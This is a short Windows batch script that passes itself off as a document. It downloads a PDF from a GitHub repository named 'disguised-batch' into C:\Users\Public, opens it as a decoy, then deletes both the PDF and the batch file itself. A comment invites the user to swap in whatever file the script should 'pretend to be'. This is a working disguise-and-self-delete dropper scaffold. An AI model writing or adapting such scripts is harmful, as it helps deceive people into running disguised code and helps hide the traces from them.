@echo off
cd C:\Users\Public
REM change the link below to whatever this file is supposed to pretend to be
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/wishtag/disguised-batch/refs/heads/main/document.pdf -OutFile document.pdf"
document.pdf
timeout /t 2 /nobreak
del document.pdf
del document.bat